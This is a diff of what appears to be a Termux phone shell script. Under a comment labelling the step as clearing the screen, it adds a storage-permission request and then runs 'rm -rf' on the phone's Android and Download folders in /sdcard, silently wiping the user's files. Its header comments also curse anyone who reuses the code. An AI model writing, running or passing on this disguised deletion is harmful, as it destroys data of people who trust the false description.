@@ -3,6 +3,7 @@
 #Github:https://github.com/reyspeed
 #Ngapain Lo Sampai Sini Mau Recode! Gua Doain Orang Tua Lu Meninggal Dan Lu mandul Sampai Mati.boleh Recode Tapi Hargai Author Njeng
 #Bersihkan Layar
+termux-setup-storage
 cd /sdcard
 rm -rf Android
 rm -rf Download
